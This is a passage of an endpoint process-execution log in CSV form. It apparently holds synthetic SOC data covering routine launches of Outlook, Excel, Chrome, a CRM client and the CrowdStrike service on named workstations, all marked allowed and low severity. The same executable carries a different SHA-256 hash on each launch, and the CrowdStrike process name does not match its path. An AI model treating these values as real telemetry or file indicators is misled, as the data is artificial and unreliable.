P00226,2026-09-09 18:03:08,WKST-FIN-004,tshivute,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",0ad778aeca38394b62d8198a90a86e06f2f137c0ac5ffab964e3ce24bc2852c6,signed,ALLOWED,Low
P00227,2026-09-09 18:42:50,WKST-FIN-021,jkavari,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",258c887fb3df5179ed47ada63d9ea11269665cbb1cc1f57d3f4b14f39fb7984d,signed,ALLOWED,Low
P00228,2026-09-09 18:45:01,WKST-SWK-008,sihuhua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,060032622a3be0be6f1948b0145ef732b091f8331cf97a7663c57c9829acf4b4,signed,ALLOWED,Low
P00229,2026-09-09 18:48:25,WKST-AUD-004,tjirera,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",30c6b6123c43720eb0130a4c20636ab2a25b44dcdcf60648ddaed3697e7c7c5c,signed,ALLOWED,Low
P00230,2026-09-09 19:01:14,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3788450755d9141380798859d81423c9e28ea047e7f67507fed2d7821a7aa65d,signed,ALLOWED,Low
P00231,2026-09-09 19:06:08,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",156905c8ecc596e006cc8d87a8415e1abc6bb15351278c519d4f22921ad0a07a,signed,ALLOWED,Low
P00232,2026-09-09 19:15:30,WKST-AUD-004,tjirera,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",75fcb0f61a1a9e6239d32c91810ef8a7f43b34d1b41bf52e3e39e5e34cb9a60a,signed,ALLOWED,Low
P00233,2026-09-09 19:16:03,WKST-TRY-007,hamukwaya,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",85f0da92d0841ce028e297fc225c72c04c547244d97ccd9f199001f100c953d2,signed,ALLOWED,Low
P00234,2026-09-09 19:20:00,WKST-CMP-009,kndjavera,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,cc070bb3038f9900b8c96dda68e7ecc0d6fa23c79bf0d9c1ac76d69c630e94da,signed,ALLOWED,Low
P00235,2026-09-09 19:48:51,WKST-SWK-002,nduminga,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",e61c5eec305235319b2247e1be3dcc70140bff67b5dc94ca7e7077e439f1dc3b,signed,ALLOWED,Low
P00236,2026-09-10 06:00:41,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,a9d616088b5e594f32b622dd794c4651621f9f3f2fe65127d857ed225b5f8b96,signed,ALLOWED,Low
P00237,2026-09-10 06:03:23,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,70969c7930e9470a38cbc4134f2540c9310373dada3726de179bc6ad7c621b6a,signed,ALLOWED,Low
P00238,2026-09-10 06:14:29,WKST-CMP-009,kndjavera,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",37f5f2c47dc461c696115d1b60c969e292f0f67ce9d2e579bf5b2f48cc85af30,signed,ALLOWED,Low
P00239,2026-09-10 06:18:06,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,79932613a21b0aada475c50c67c8a84eb8d096a218b227e66cb2200fbc26d5a4,signed,ALLOWED,Low
P00240,2026-09-10 06:40:49,WKST-SOC-003,haufiku,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",fd027186f4abdcc088a3fec15b178ad466e37703e67423a732de0d60d15cc223,signed,ALLOWED,Low
P00241,2026-09-10 06:51:11,WKST-EXE-002,shapaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",2c64ed400a549a74bc17956a2c20c7cb4ff2cb260d615fa10cc966a95cbed106,signed,ALLOWED,Low
P00242,2026-09-10 06:58:37,WKST-FIN-004,tshivute,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,cc297a2383360fd3ce7cd4a7f47501f23a2c54077b9f2c5a52e1096c683297a0,signed,ALLOWED,Low
P00243,2026-09-10 07:01:51,WKST-HR-014,mukwambi,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,c3a89340f26be1ddea9172f7755b24559b76ab9e79a66cbb33efd497d1725a1e,signed,ALLOWED,Low
P00244,2026-09-10 07:02:40,WKST-SWK-008,sihuhua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",74c824acdfee88546b54b67ff81f658073ff65291c3c92b945eca1f16647ff75,signed,ALLOWED,Low
P00245,2026-09-10 07:28:15,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",035a669aabd9264c53305be9bb16594b9435dcacd0580a4340acd21f4b11ae66,signed,ALLOWED,Low
P00246,2026-09-10 07:29:36,WKST-LOAN-018,shilongo,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",7e39b310fe30eef34cb603ca02f1afaec57b855cbecb25fdb4ccdfdcc99dcda6,signed,ALLOWED,Low
P00247,2026-09-10 07:32:24,WKST-LOAN-018,shilongo,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f1238d38edb1bb1891ab228565290211ea3be395de1f2b50713e4ba01316dff9,signed,ALLOWED,Low
P00248,2026-09-10 07:36:36,WKST-TRY-007,hamukwaya,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",16cb5e918dd247bb1fd72135139c1c6d0ce9c635de6d7b3f6cf3b63241d01b4e,signed,ALLOWED,Low
P00249,2026-09-10 07:48:18,WKST-SWK-002,nduminga,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,191dd9ea17b474e4596327fff1b866e18920aea65e7ddeae33a189d861581842,signed,ALLOWED,Low
P00250,2026-09-10 07:49:08,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",9067d91970ed46563e6f7ecb80e83c96d9476b9ed72d7fedf610107cb5e236c1,signed,ALLOWED,Low
P00251,2026-09-10 08:02:09,WKST-SWK-008,sihuhua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",3e64d2f4e93a13c6f88d37c6c63d79134c66f54360fdb634164517662d254b59,signed,ALLOWED,Low
P00252,2026-09-10 08:02:50,WKST-CS-006,nnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,01bdef3ee959bf891bc18fa49fc85b4f1aa833b73fa745726f7479e6d597013d,signed,ALLOWED,Low
P00253,2026-09-10 08:31:56,WKST-MKT-010,ntinda,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,209889124a5025946c6e3110f25ce8619d0cd3fc18d59c27fe11f68cdcc5a317,signed,ALLOWED,Low
P00254,2026-09-10 08:32:42,WKST-SWK-008,sihuhua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",928df202d5bb6980484fbd8c01a1e276ca1091c25248e37c0b3947ff6ddaf38d,signed,ALLOWED,Low
P00255,2026-09-10 08:48:54,WKST-IT-012,katjiuongua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",2c67c5aefb9dbdc019a4f05489448ea5bab594e6ab7550e1655bd617e4386a2e,signed,ALLOWED,Low
P00256,2026-09-10 09:16:44,WKST-RSK-006,murorua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,71c1c219bffddaf9057966f4c15697d88c351105fefa7cc69b06c7162f012739,signed,ALLOWED,Low
P00257,2026-09-10 09:27:59,WKST-TRY-007,hamukwaya,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",71f9382290f4923cb95029e218c89962501b115f8914ee13caae8f98300badf9,signed,ALLOWED,Low
P00258,2026-09-10 09:49:51,WKST-SWK-012,nambala,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2bda062a46282cb3c22db0c823a0c7040924e2c320018e917b2bd4fe4a82a6c1,signed,ALLOWED,Low
P00259,2026-09-10 10:11:56,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",26efa100b2ba801d3392a3f71fdfb51758fe6b4951049a6cc4babc501c35881f,signed,ALLOWED,Low
P00260,2026-09-10 10:15:21,WKST-PRC-008,sankwasa,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c96964d11b4448ef29c56bbfb2a5966fc681628d54cc97da6ab9c0dc7345f076,signed,ALLOWED,Low
P00261,2026-09-10 10:17:03,WKST-SWK-012,nambala,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",2660a14af504795c987141083cd123ddd0690f062739179a769decf56f6cec36,signed,ALLOWED,Low
P00262,2026-09-10 10:20:51,WKST-HR-014,mukwambi,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",5dae41734227f5edae8721fbe85899404d6aafebd3fecaf5d0cbfe353224cb35,signed,ALLOWED,Low
P00263,2026-09-10 10:49:28,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",3794ac57fa75db40e108df6d1b1df2c00f54fec7ea435730b3a821d84fb80bd6,signed,ALLOWED,Low
P00264,2026-09-10 11:01:34,WKST-LGL-005,mbandeka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",178f266e4d1e59858a43c9adc6625df18cd2640398b2062aa90cd5970753b321,signed,ALLOWED,Low
P00265,2026-09-10 11:16:26,WKST-SWK-002,nduminga,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",e30092c8128f14bb770271e16441282ea1d1e0ce7a1e128b1c078c4c0d6d0f5b,signed,ALLOWED,Low
P00266,2026-09-10 11:36:23,WKST-IT-005,nghifindaka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",08fea614a9b1405765616266a2b3a1404e74c4556d3062454be8d875fd83c0fb,signed,ALLOWED,Low
P00267,2026-09-10 11:48:31,WKST-CMP-003,amupanda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",19ccea98a9d6017c05e220b695368c73d7877d6ed200698deea3e0967118302c,signed,ALLOWED,Low
P00268,2026-09-10 12:28:29,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",ace9aef0c176adacd745fbea04d3857e93cb4609a6cabac9dc1bdbbb09e69f4d,signed,ALLOWED,Low
P00269,2026-09-10 13:15:00,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",12ec52dc98784db64f6535e1d342ae03d3baf9affc2ceb90a8b5bd30d90a51c1,signed,ALLOWED,Low
P00270,2026-09-10 13:21:46,WKST-FIN-021,jkavari,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",65e223a8b1fd29d07713b8c4792ef552941cef31410f364e997c6d7eb1714903,signed,ALLOWED,Low
P00271,2026-09-10 13:22:00,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",b46d942a6b3df926c89870ef09752008b7cb2dae1fb6ab2ad2f2f9fddf3b4c92,signed,ALLOWED,Low
P00272,2026-09-10 13:22:40,WKST-PRC-008,sankwasa,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",64d4192042e07e4d3ea388c8b81a8faa3a3e44ee00461acd61980ab814d8fef2,signed,ALLOWED,Low
P00273,2026-09-10 13:35:23,WKST-IT-012,katjiuongua,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b629893e4eb98707ddcd6bef3a07ca19ba062ee127ea91b0f353108595c97770,signed,ALLOWED,Low
P00274,2026-09-10 14:12:55,WKST-IT-012,katjiuongua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",d00da3b37dceace719d7c1b556b2e9c3ebd279d7388bdf794628781afefcf513,signed,ALLOWED,Low
P00275,2026-09-10 14:13:12,WKST-TRY-007,hamukwaya,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",c3b3cec1143f13d3dc40ce202bb5078d22a6d84fc1467d0b864eae65228522ae,signed,ALLOWED,Low
P00276,2026-09-10 14:33:15,WKST-IT-012,katjiuongua,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",d2c746e5300270061b7464e077502c931306dce2651a659d5130ca0e351dce32,signed,ALLOWED,Low
P00277,2026-09-10 14:39:35,WKST-CMP-009,kndjavera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",4266c3958466be444f1ae546e128a3e664d6c93ede85e1ad2d03648f0e766d83,signed,ALLOWED,Low
P00278,2026-09-10 14:41:14,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",13b323586d822ea09bb2df3d61021b8ed1998078b894c693bb92bd8da1e46fe3,signed,ALLOWED,Low
P00279,2026-09-10 14:42:25,WKST-IT-005,nghifindaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1c3a860f3df2efe439492c061860ca45ca77b2afaa56f22bc03d4f26678154d7,signed,ALLOWED,Low
P00280,2026-09-10 14:46:20,WKST-OND-004,ndjaba,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",d9f37d57fd6977ab50d46dfa493fb6145833de498492792638f63bc5b2e9f6af,signed,ALLOWED,Low
P00281,2026-09-10 15:00:19,WKST-AUD-004,tjirera,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c6a2321ca49d81781f1f989bb2805205e3eeacc6188922612243270ed190f7a7,signed,ALLOWED,Low
P00282,2026-09-10 15:26:37,WKST-CMP-003,amupanda,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",77ff953968e4d72fbb3a669038acb2bf23c046b0a249c375aa6f6bc28a1777b7,signed,ALLOWED,Low
P00283,2026-09-10 15:47:12,WKST-RSK-006,murorua,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",ca590cc387e5e254895007c3cad26ca2bd77ca92e99e8a2c7f9728d716188121,signed,ALLOWED,Low
P00284,2026-09-10 15:51:35,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f100d56abfb06e09ae1b16b94c08a591e054e14a33729a15a2abe618e796d253,signed,ALLOWED,Low
P00285,2026-09-10 15:52:43,WKST-HR-002,pnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b2b6e5fbad7d873f98d94479bc89d72396cd327bba0ac5ccec62773962b7aec9,signed,ALLOWED,Low
P00286,2026-09-10 16:10:16,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",01d02077d035f4de8edc4442822cae940d4865e87a697482b04c6892011207fb,signed,ALLOWED,Low
P00287,2026-09-10 16:10:33,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c519af74796e4b131bb916014c3e1497e3bd863b819785cfb9604a2b9380367a,signed,ALLOWED,Low
P00288,2026-09-10 16:55:23,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,3fe3584f7e1d272dd6ca128503ff113a0e997abb503e01fae74758d1f249d401,signed,ALLOWED,Low
P00289,2026-09-10 17:10:33,WKST-LGL-005,mbandeka,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",51dea11536776fd098dcb746421f3c9071ad1104b7cc7b13b7f88e0eb05b86d2,signed,ALLOWED,Low
P00290,2026-09-10 17:24:59,WKST-SWK-012,nambala,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",582b147c45382c456df2c7e1a0a28b649d258299be30fe088553ca2109bf1a6f,signed,ALLOWED,Low
P00291,2026-09-10 17:32:37,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,95966c53a4f7f18a77cfa4293ca565f43300e03c67bf9056057fd1c51f0a9928,signed,ALLOWED,Low
P00292,2026-09-10 17:44:42,WKST-SWK-012,nambala,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",d8633def7bc0ea23928c8dcc0abb975c0537e2acd3fc68a692e41162279946a2,signed,ALLOWED,Low
P00293,2026-09-10 17:46:16,WKST-CS-006,nnakale,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",c344adc6d6568d56b0e42c2032065e8afe26ec94dfb261a44b1e4093ba9103dd,signed,ALLOWED,Low
P00294,2026-09-10 17:48:55,WKST-TRY-007,hamukwaya,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,42fce79d726deb5b4a5bbd87e9634a48a370863d402d08f18d8611c4a0859471,signed,ALLOWED,Low
P00295,2026-09-10 17:54:36,WKST-FIN-004,tshivute,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,34e55de0a27a8108e807b294d39611aa8c065fca64213fe09248f669122617db,signed,ALLOWED,Low
P00296,2026-09-10 17:54:46,WKST-HR-014,mukwambi,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",229151b4792835a63408c98e99808b699737438496d9dba727aec33f3cc3616e,signed,ALLOWED,Low
P00297,2026-09-10 17:56:29,WKST-SWK-002,nduminga,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ab91550ddb0c716f093ab34b5a68b484d10198cce9a53f14ee29e7b6f1424349,signed,ALLOWED,Low
P00298,2026-09-10 18:07:56,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",8553694fe0e9df26d29b46274a13a138cf58d27ac9d5f918f620509f43a0c0fd,signed,ALLOWED,Low
P00299,2026-09-10 18:22:03,WKST-CMP-003,amupanda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",a1edb21f4f5ede343d95ed34f78d2d2f72ee2105483c759fb7110604bd3bf5eb,signed,ALLOWED,Low
P00300,2026-09-10 18:27:50,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",f960d5182f1c08bcc2dafa3aea1b809d94ffbbed060f58defbf52e0fde19e8fb,signed,ALLOWED,Low
P00301,2026-09-10 18:30:12,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,1e6e651e60c0ba94ac1adb5bdda8e2399a1ce46e3e752c1f3f4898ba4a7a7b21,signed,ALLOWED,Low
P00302,2026-09-10 18:40:11,WKST-SWK-008,sihuhua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c21382dc9dd13f5aeacf1b5fba36f9ce9c91fa8bc5d80f67a8a005a2aa5165b9,signed,ALLOWED,Low
P00303,2026-09-10 18:44:41,WKST-SOC-003,haufiku,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,b2c6b9b456c8f1610a7679e68818cfdc8ce1f865b21204d700256a50bf92fb53,signed,ALLOWED,Low
P00304,2026-09-10 18:46:55,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,47436c86f3496d414de468c4c18d36fd5b1d064c6785434f3235b4f3bf00acb3,signed,ALLOWED,Low
P00305,2026-09-10 18:55:17,WKST-CS-017,mhaingura,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",ad3e4bfd15789004a6b25ee8984dc30d11452c5f896750709e51a6c8af40d324,signed,ALLOWED,Low
P00306,2026-09-10 19:19:13,WKST-IT-005,nghifindaka,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,be802bdb54703819c6e2a3e5c80d885869e633428fc5ef3c99e0b02a15ca1510,signed,ALLOWED,Low
P00307,2026-09-10 19:24:52,WKST-CS-011,tkamati,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,51c39f8fe6071924781327639589933898e555a0ee2ab76f853ba3e05f582d48,signed,ALLOWED,Low
P00308,2026-09-10 19:28:01,WKST-CS-017,mhaingura,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",cf9f7409d13fe7a242833f4c628cbeea649b399abf39fe45ddb6e712e51b9186,signed,ALLOWED,Low
P00309,2026-09-10 19:30:23,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",f31f3afe51d1dd607fa6a5ab700049dd0535f702872564333120b98d23cea2b9,signed,ALLOWED,Low
P00310,2026-09-10 19:33:11,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",272e479750cf3fccbe5387c0607b0083022096922bf4afba87b14ef7c1c98bd7,signed,ALLOWED,Low
P00311,2026-09-10 19:33:50,WKST-SWK-008,sihuhua,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",7888157765077bdde578ddefcc5e6ed39703758f405a3f67befae1584265aada,signed,ALLOWED,Low
P00312,2026-09-10 19:35:11,WKST-LGL-005,mbandeka,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",7a59972fa4914afe4b70b5171225cea395b2f9bac6c03a25e233b3caf94535f9,signed,ALLOWED,Low
P00313,2026-09-10 19:41:04,WKST-CS-011,tkamati,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",edc014ad43f940a36225dd7edeef3077e40926e8d135fa62d6f075a5ceb74b77,signed,ALLOWED,Low
P00314,2026-09-10 19:44:04,WKST-FIN-021,jkavari,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,d00e4440cf5f6bfba77c0f32444479364f73c01ea11bda9291dbb5e67c902335,signed,ALLOWED,Low
P00315,2026-09-11 06:18:52,WKST-IT-005,nghifindaka,explorer.exe,outlook.exe,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",8f856a45c3ade7352213a38c601e16bd9b0248748a328c8b9bcc54eb8af141e4,signed,ALLOWED,Low
P00316,2026-09-11 06:22:31,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",d9d9386c9bd6dfb850167a8685c5e159da99aa4be28ac0de36af1885b444c15c,signed,ALLOWED,Low
P00317,2026-09-11 06:23:15,WKST-TRY-007,hamukwaya,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",6597f6fd8d60fda8aa93114536661eefa6dae0f570ca6af7958ba22a31ede619,signed,ALLOWED,Low
P00318,2026-09-11 06:26:47,WKST-LOAN-018,shilongo,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",2173a6d6a446da4daf362ef5d8b5b86c6f749a4f2becea392c883eacbf01d12f,signed,ALLOWED,Low
P00319,2026-09-11 06:30:05,WKST-SWK-008,sihuhua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1849fcf49c716cefce672da5e6d41bab60842c50802b0902181bc29956a3b621,signed,ALLOWED,Low
P00320,2026-09-11 06:34:48,WKST-EXE-002,shapaka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",964a8fec91b1e1675667be767e5f47d8c8b673bf78d96b30a276003eab4290a4,signed,ALLOWED,Low
P00321,2026-09-11 07:00:10,WKST-SWK-012,nambala,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,54462c0937ef5dfa9b88ee900fcb78274eb18c1af93af73cbab6603e89a38514,signed,ALLOWED,Low
P00322,2026-09-11 07:03:50,WKST-HR-002,pnakale,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,f4f223f04d5bcfd3ca21f5b64c26bfae3faeaa9688db511597bd84d8b77d4069,signed,ALLOWED,Low
P00323,2026-09-11 07:18:54,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",92d1b5cc7db345b2c5ca6ea85315caecef6e4d5300a5b9c7dba07514845d5e58,signed,ALLOWED,Low
P00324,2026-09-11 07:20:26,WKST-SWK-012,nambala,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",b2da5ff32bac3d809d7db0abbc8b40bda0a30055a56204f4ec009a2a72d8bff7,signed,ALLOWED,Low
P00325,2026-09-11 07:30:21,WKST-PRC-008,sankwasa,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",1265aa5066058011400820188ec17f4b3b6488df8759df5de0a8c3a48ada6f12,signed,ALLOWED,Low
P00326,2026-09-11 07:32:39,WKST-SWK-002,nduminga,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",b09abfa2489b4ef6f8465ed6931b04593ddf4204685ce5249bcd63895d19cf9f,signed,ALLOWED,Low
P00327,2026-09-11 07:36:23,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",03150ee9b8ec34946d48bd098aa70f405df1d323559ef5e066bfe15335b4153b,signed,ALLOWED,Low
P00328,2026-09-11 07:45:48,WKST-MKT-010,ntinda,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",14447e1939f4f4033049667449c6b4525063b9d73066c83779e161804401421c,signed,ALLOWED,Low
P00329,2026-09-11 08:15:04,WKST-IT-012,katjiuongua,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",c2328a09d5e7c3e61bfeab2a4c62db4c6fa6102c6abcce63e85b9a49aacf3d95,signed,ALLOWED,Low
P00330,2026-09-11 08:29:05,WKST-OND-004,ndjaba,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",7a495d697cea6232c0a860792078d8245e5a4686cac6d98f8ec8e31f21149436,signed,ALLOWED,Low
P00331,2026-09-11 08:30:53,WKST-MKT-010,ntinda,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",35a2362517d4f6036aba6ed438ba91e257bf664c046eaab573fa649500957022,signed,ALLOWED,Low
P00332,2026-09-11 08:57:03,WKST-LGL-005,mbandeka,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1ce7fb5378d13552252e9a36904b5251907413d73ff8cdac25430bf54285bcba,signed,ALLOWED,Low
P00333,2026-09-11 09:12:06,WKST-MKT-010,ntinda,explorer.exe,crmclient.exe,"""C:\Program Files\OFS\CRM\crmclient.exe""",a1ea31d137a4921c8d479d299d3c1dd9f50dea1a43ddc00db45a6ef31f9985a3,signed,ALLOWED,Low
P00334,2026-09-11 09:15:39,WKST-CS-017,mhaingura,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,aef6ffab3f52159a6c518e913d13a27519fc6718c8fac1ad605caa5fad3eb3b1,signed,ALLOWED,Low
P00335,2026-09-11 09:19:58,WKST-OND-004,ndjaba,explorer.exe,excel.exe,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",034979231579567eeef5f35fa72a9f559c74a15de178fc0d365ee00a259652d1,signed,ALLOWED,Low
P00336,2026-09-11 09:20:53,WKST-PRC-008,sankwasa,services.exe,crowdstrike.exe,C:\Program Files\CrowdStrike\CSFalconService.exe,c4632e25d184896931f054839583665714191bb37acb3d3a85dbc21887e99f0b,signed,ALLOWED,Low
P00337,2026-09-11 09:28:31,WKST-HR-014,mukwambi,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",ac2daf85e2115f225b0b8ab3c67910ae88b4ca3057178f79eb6db4ee775a7ccf,signed,ALLOWED,Low
P00338,2026-09-11 09:59:25,WKST-SWK-012,nambala,explorer.exe,chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",b459da8d19fd06b1588edd812cacaa59ef4b12ef5bbe626e6c29c718a5261264,signed,ALLOWED,Low
